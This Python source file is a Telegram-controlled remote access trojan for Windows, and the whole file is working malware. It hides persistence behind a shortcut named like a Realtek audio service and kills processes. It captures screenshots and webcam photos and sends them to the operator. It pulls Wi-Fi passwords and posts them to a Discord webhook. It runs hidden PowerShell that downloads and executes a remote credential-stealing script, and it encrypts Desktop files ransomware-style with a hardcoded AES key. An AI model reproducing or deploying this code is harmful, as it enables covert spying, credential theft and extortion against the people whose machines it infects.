# IMPORTANT
# This code is really ugly, it was made for fun. 
# I changed some parts to ********************** for privacy reasons

import re
import requests
import telepot
import os
import psutil
from pygame import mixer
import time
import socket
from telepot.loop import MessageLoop
from telepot.namedtuple import ReplyKeyboardMarkup
import shutil
import win32com.client
import winshell
import sys
import subprocess
from PIL import ImageGrab
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad
import threading
import command
from telegram import Update
from win32com.client import Dispatch
import pythoncom
import cv2

is_encryption_in_progress = False
encryption_lock = threading.Lock()
encryption_thread = None
webhook_url = "**********************"
credz_url= "**********************"
db = ''

# Check if the "programms" folder exists in the "C:" directory
cartella_programms = r"C:\programms"
if not os.path.exists(cartella_programms):
    # If not, create the "programms" folder
    os.makedirs(cartella_programms)


# Search for the full path of "watchdogg.exe" in the system
watchdogg_file = "watchdogg.exe"
for root, dirs, files in os.walk("C:\\"):
    if watchdogg_file in files:
        watchdogg_path = os.path.join(root, watchdogg_file)
        break
else:
    print("watchdogg.exe non trovato nel sistema.")
    sys.exit(1)

# Move the "watchdogg.exe" file to the "programms" folder
percorso_completo_destinazione_exe = os.path.join(cartella_programms, watchdogg_file)
shutil.move(watchdogg_path, percorso_completo_destinazione_exe)

# Create the full path for the .lnk file in the "programms" folder
percorso_completo_destinazione = os.path.join(cartella_programms, "RtKAudUService64.lnk")

# Create the shortcut (.lnk file) in the "programms" folder
pythoncom.CoInitialize()
shell = Dispatch('WScript.Shell')
shortcut = shell.CreateShortCut(percorso_completo_destinazione)
shortcut.Targetpath = percorso_completo_destinazione_exe
shortcut.WorkingDirectory = cartella_programms
shortcut.save()

# Move the shortcut to the "shell:startup" folder
cartella_startup = winshell.startup()
percorso_completo_destinazione_startup = os.path.join(cartella_startup, "RtKAudUService64.lnk")
shutil.move(percorso_completo_destinazione, percorso_completo_destinazione_startup)

def greenSquare():
    return u'\U00002705'
def redSquare():
    return u'\U0000274C'
def playGlitch():
    mixer.init()
    mixer.music.load('C:\dev\watchdog\sound.mp3')
    mixer.music.play()
def davidId():
    return "**********************"
def botToken():
    return "**********************"

def notifyTelegramPoint():
    bot.sendMessage(davidId(), '.')

def waitForInternetConnection():
    try:
        host = socket.gethostbyname("www.google.com")
        s = socket.create_connection((host, 80), 2)
        return True
    except:
        pass
    return False

def start_encryption():
    global is_encryption_in_progress

    with encryption_lock:
        is_encryption_in_progress = True

    key = b'SuperkarILDODOoO'
    desktop_path = Path.home() / "Desktop"
    folder_paths = [str(desktop_path)]

    while is_encryption_in_progress:
        for folder_path in folder_paths:
            if not is_encryption_in_progress:
                break

            for root, dirs, files in os.walk(folder_path):
                if not is_encryption_in_progress:
                    break

                for file in files:
                    input_file = os.path.join(root, file)
                    
                    # Ignore the "Downloads" folder and files already encrypted
                    if folder_path == str(desktop_path) and not input_file.endswith('.encrypted') and not input_file.endswith('.exe'):
                        output_file = input_file + '.encrypted'

                        try:
                            encrypt_file(key, input_file, output_file)
                            os.remove(input_file)
                            print(f"Cifrato il file: {output_file}")
                        except Exception as e:
                            print(f"Errore durante la cifratura del file {input_file}: {str(e)}")


def encrypt_file(key, input_file, output_file):
    cipher = AES.new(key, AES.MODE_CBC)

    with open(input_file, 'rb') as file:
        plaintext = file.read()
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

    with open(output_file, 'wb') as file:
        file.write(cipher.iv)
        file.write(ciphertext)

    # Send a message on Telegram with the path of the encrypted file
    notify_telegram_file_ciphertext(output_file)

def notify_telegram_file_ciphertext(file_path):
    message = f"File crittografato: {file_path}"
    bot.sendMessage(davidId(), message)
        
def stop_encryption():
    global is_encryption_in_progress

    with encryption_lock:
        is_encryption_in_progress = False

def decrypt_file(key, input_file, output_file):
    with open(input_file, 'rb') as file:
        iv = file.read(16)
        ciphertext = file.read()

    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)

    with open(output_file, 'wb') as file:
        file.write(decrypted_data)

    # Send a message on Telegram with the name of the decrypted file
    notify_telegram_file_decrypted(os.path.basename(output_file))

def notify_telegram_file_decrypted(file_name):
    message = f"File decifrato: {file_name}"
    bot.sendMessage(davidId(), message)

def clear_messages(chat_id, message_id):
    for i in range(1, 60):  # Delete previous messages up to the specified message
        bot.deleteMessage((chat_id, message_id - i))

def checkIfProcessRunning(processName):
    '''
    Check if there is any running process that contains the given name processName.
    '''
    # Iterate over all the running processes
    for proc in psutil.process_iter():
        try:
            # Check if the process name contains the given name string.
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False

def killFortnite(): #kill fortnite process
    if(fortniteRunning()):
        os.system("taskkill /f /im FortniteClient-Win64-Shipping.exe")

def fortniteRunning():
    return checkIfProcessRunning("FortniteClient-Win64-Shipping.exe")

def killFortniteLauncher(): #kill fortnite launcher process
    if(fortniteLauncherRunning()):
        os.system("taskkill /f /im EpicGamesLauncher.exe")

def fortniteLauncherRunning():
    return checkIfProcessRunning("EpicGamesLauncher.exe")

def killTelegram():
    if(telegramRunning()):
        os.system("taskkill /f /im Telegram.exe")

def telegramRunning():
    return checkIfProcessRunning("Telegram.exe")

def killTL():
   if(TLrunning()):
        os.system("taskkill /f /im javaw.exe")

def TLrunning():
    return checkIfProcessRunning("javaw.exe")

def killDiscord():
    if discordRunning():
        os.system("taskkill /f /im Discord.exe")

def KillProgram():
    if programrunning():
        os.system("taskkill /f /im watchdogg.exe")

def programrunning():
    return checkIfProcessRunning("watchdogg.exe")

def discordRunning():
    return checkIfProcessRunning("Discord.exe")

def apexRunning():
    return checkIfProcessRunning("r5apex.exe")

def killApex():
    if(apexRunning()):
        os.system("taskkill /f /im r5apex.exe")
    
def ExplorerRunning():
    return checkIfProcessRunning("explorer.exe")

def killexplorer():
    if(ExplorerRunning()):
        os.system("taskkill /f /im explorer.exe")

def getIPAddress():
    # Get the hostname
    hostname = socket.gethostname()

    # Get the IP address associated with the hostname
    ip_address = socket.gethostbyname(hostname)

    return ip_address

# Function to capture a screenshot of the desktop and save it to disk   
def capture_screen():
    # Taking the screenshot
    screenshot = ImageGrab.grab()

    # Full path to the screen
    save_path = "C:\\programms\\screenshot.png"

    # Saving the image to Disk
    screenshot.save(save_path, "PNG")

# Function to send the screenshot to Telegram
def send_screenshot_to_telegram():
    # Capture the screenshot
    capture_screen()

    # Path of the screen
    screenshot_path = "C:\\programms\\screenshot.png"

    # Check if the .png exist
    if os.path.exists(screenshot_path):
        # Send the screenshot to Telegram
        bot.sendPhoto(davidId(), photo=open(screenshot_path, 'rb'))

        # Delete the file Screeenshot
        os.remove(screenshot_path)
    else:
        bot.sendMessage(davidId(), "Errore: il percorso dell'immagine non esiste.")

# Function to capture a photo with the webcam and save it to disk
def capture_webcam_image():
    # Open the webcam
    cap = cv2.VideoCapture(0)

    # Take a photo
    ret, frame = cap.read()

    # Close the webcam
    cap.release()

    # Full path to save the photo
    save_path = "C:/programms/webcam.png"

    # Save the image in the disk
    cv2.imwrite(save_path, frame)

    return save_path

# Function to send the webcam photo to Telegram
def send_webcam_image_to_telegram():
    # Take the foto
    image_path = capture_webcam_image()

    # Check if the photo exist
    if os.path.exists(image_path):
        # Send it to Telegram
        bot.sendPhoto(davidId(), photo=open(image_path, 'rb'))

        # Delete the photo
        os.remove(image_path)
    else:
        bot.sendMessage(davidId(), "Errore: il percorso dell'immagine non esiste.")

def wifi():
    # Execute the command netsh wlan show interfaces
    output = subprocess.check_output("netsh wlan show interfaces", shell=True).decode("latin-1")

    # Find the Wi-Fi network name
    matches = re.search(r"SSID\s+:\s(.+)", output)
    if matches:
        wifi_name = matches.group(1)
    else:
        wifi_name = "N/A"

    # Prepare the payload to send the Wi-Fi network name to Discord
    payload = {
        "content": f"Wi-Fi Name: {wifi_name}"
    }

    # Send the payload to the Discord webhook
    response = requests.post(webhook_url, json=payload)

    # Check the response status code
    if response.status_code == 204:
        print("Wi-Fi Name message sent successfully to Discord.")
    else:
        print("Unable to send the Wi-Fi Name message to Discord.")

    # Execute the command to get the Wi-Fi password
    password_output = subprocess.check_output(f"netsh wlan show profile name=\"{wifi_name}\" key=clear", shell=True).decode("latin-1")

    # Find the password line after "Contenuto chiave"
    password_matches = re.search(r"Contenuto chiave\s+:\s(.+)", password_output, re.IGNORECASE)
    if password_matches:
        wifi_password_line = password_matches.group(1)
    else:
        wifi_password_line = "N/A"

    # Prepare the payload to send the Wi-Fi password line to Discord
    payload = {
        "content": f"Wi-Fi Password Line: {wifi_password_line}"
    }

    # Send the payload to the Discord webhook
    response = requests.post(webhook_url, json=payload)

    # Check the response status code
    if response.status_code == 204:
        print("Wi-Fi Password Line message sent successfully to Discord.")
    else:
        print("Unable to send the Wi-Fi Password Line message to Discord.")
        
def credz(): 
    subprocess.run(['powershell', '-w', 'h', '-ep', 'bypass', f'$dc=\'{credz_url}\';$db=\'{db}\';irm https://jakoby.lol/35k | iex'])

def killAll():
    killFortniteLauncher()
    killFortnite()
    killTelegram()
    killDiscord()
    killApex()
    killTL()

def updateUser():
    killTelegram() #prevent user seeing message on desktop

    if(fortniteLauncherRunning()):
        bot.sendMessage(davidId(), "FL" + greenSquare())
    else:
        bot.sendMessage(davidId(), "FL" + redSquare())

    if (fortniteRunning()):
        bot.sendMessage(davidId(), "F" + greenSquare())
    else:
        bot.sendMessage(davidId(), "F" + redSquare())
    if (discordRunning()):
        bot.sendMessage(davidId(), "D" + greenSquare())
    else:
        bot.sendMessage(davidId(), "D" + redSquare())

    if(apexRunning()):
        bot.sendMessage(davidId(), "A" + greenSquare())
    else:
        bot.sendMessage(davidId(), "A" + redSquare())

    if(TLrunning()):
        bot.sendMessage(davidId(), "j" + greenSquare())
    else:
        bot.sendMessage(davidId(), "j" + redSquare())

def shutdownPc():
    os.system('shutdown -s -t 0')

def handle(msg):  # What to do if a new message is received
    global bot, is_encryption_in_progress, encryption_thread

    contentType, chatType, chatId = telepot.glance(msg)
    text = msg['text'].upper()
    if not (chatId == 5171177485):
        bot.sendMessage(chatId, "CHI SEI?! LO DIRò AL MIO MAESTRO")
        bot.sendMessage(davidId(), 'Someone contacted me! Here is the information:\n' + str(msg))

    elif (text == 'KILL' or text == 'KILLALL' or text == 'KILL ALL' or text == 'KA'):
        killAll()
        notifyTelegramPoint()
    elif(text == 'KILL FORTNITE' or text == 'KF' or text == 'K'):
        killTelegram()
        killFortnite()
        killFortniteLauncher()
        notifyTelegramPoint()
    elif(text == 'UPDATE' or text == 'U'):
        updateUser()
    elif (text == '/START'):
        bot.sendMessage(davidId(), "Bentornato maestro", reply_markup=keyboard)
    elif(text == 'SHUTDOWN'):
        bot.sendMessage(davidId(), "Shutting down. Bye Bye")
        shutdownPc()
    elif(text == 'KILL ALL WITH REACTION' or text == 'KAWR'):
        killAll()
        notifyTelegramPoint()
        bot.sendMessage(davidId(), "Reaction still not implemented")
    elif(text == 'KIM'):
        time.sleep(60)
        killAll()
        notifyTelegramPoint()
    elif(text == 'KJ'):
        killTL()
        killTelegram()
        notifyTelegramPoint()
    elif(text == 'S'):
        playGlitch()
        killTelegram()
        notifyTelegramPoint()
    elif(text == 'KD'):
        killDiscord()
        killTelegram()
        notifyTelegramPoint()
    elif(text == 'PANIC'):
        bot.sendMessage(davidId(), "Addio maestro")
        KillProgram()
        killTelegram()
    elif(text == '📸CAMERA📸'):
        # Function to send the webcam photo to Telegram
        send_webcam_image_to_telegram()
        bot.sendMessage(chatId, "Foto scattata con successo e inviata a Telegram!")
    elif(text == 'WIFI'):
        wifi()
        notifyTelegramPoint()
    elif(text == 'CREDZ'):
        credz()
        notifyTelegramPoint()
    elif(text == 'KE'):
        killexplorer()
        killTelegram()
        notifyTelegramPoint()
    elif text == 'IP':
        killTelegram()
        ip_address = getIPAddress()
        bot.sendMessage(davidId(), "IPV4: " + ip_address)
    elif text == 'KILL' or text == 'KILLALL' or text == 'KILL ALL' or text == 'KA':
        killAll()
        notifyTelegramPoint()
    elif text == 'SS':
        killTelegram()
        send_screenshot_to_telegram()
        bot.sendMessage(davidId(), "Screenshot catturato!")
    elif text == '🔓DECIFRATURA🔓':
            #Use the same key of the encryption
        key = b'**********************'

        # Get the path to the desktop
        desktop_path = Path.home() / "Desktop"
        folder_path = str(desktop_path)

        # Decrypt files in Desktop folder
        files_decrypted = 0
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                if file.endswith('.encrypted'):
                    input_file = os.path.join(root, file)
                    output_file = input_file[:-10]  # Rimove the extension ".encrypted"
                    
                    try:
                        decrypt_file(key, input_file, output_file)
                        os.remove(input_file)
                        files_decrypted += 1
                    except Exception as e:
                        bot.sendMessage(chatId, f"Errore durante la decifratura del file {input_file}: {str(e)}")

        if files_decrypted > 0:
            bot.sendMessage(chatId, "Decifratura completata.")
        else:
            bot.sendMessage(chatId, "Nessun file crittografato trovato.")

    elif text == '⚠️CIFRATURA⚠️':
        if not is_encryption_in_progress:
            # Start the encryption process only if not already in progress
            encryption_thread = threading.Thread(target=start_encryption)
            encryption_thread.start()
            bot.sendMessage(chatId, 'Processo di cifratura avviato.')
        else:
            bot.sendMessage(chatId, 'Il processo di cifratura è già in corso.')

    elif (text == 'HELP'):
        help_message = "Ecco i comandi disponibili:\n\n" \
                       "shutdown - Spegni il computer\n" \
                       "update - Mostra processi\n" \
                       "killall - Termina tutti i processi associati\n" \
                       "kf - Termina il processo Fortnite\n" \
                       "kd - Termina il processo Discord\n" \
                       "kj - Termina il processo Java\n" \
                       "ke - Termina l'esplora risorse\n" \
                       "ip - Ottieni l'indirizzo IPV4 del computer\n" \
                       "ss - Cattura uno screenshot del desktop e lo invia su Telegram\n" \
                       "wifi - Mostra password e nome del wifi \n" \
                       "pulisci - Elimina 60 messaggi nella chat\n" \
                       "⚠️cifratura⚠️ - Cifra tutti i file nella cartella Desktop\n" \
                       "🔓Decifratura🔓 - Decifra i file nella cartella Desktop\n" \
                       "⛔️STOP⛔️: Interrompi il processo di crittografia in corso\n"\
                       "\n"
        bot.sendMessage(chatId, help_message)

    elif text == 'PULISCI':
        clear_messages(chatId, msg['message_id'])
        
    elif text == '⛔️STOP⛔️':
        if is_encryption_in_progress:
            stop_encryption()
            encryption_thread.join()  # Wait for the encryption thread to finish
            bot.sendMessage(chatId, 'Processo di cifratura interrotto.')
        else:
            bot.sendMessage(chatId, 'Il processo di cifratura non è in corso.')

    

time.sleep(1)
waitForInternetConnection()
bot = telepot.Bot(botToken())
MessageLoop(bot, handle).run_as_thread()
keyboard = ReplyKeyboardMarkup(keyboard=[['PANIC','SS','U'], ['KF', 'KD', 'KE'], ['KJ', 'KIM', 'IP'], ['⚠️cifratura⚠️','📸CAMERA📸', '🔓decifratura🔓'],['⛔️STOP⛔️']])
bot.sendMessage(davidId(), 'wO.Ow', reply_markup=keyboard)
while 1:
    time.sleep(1)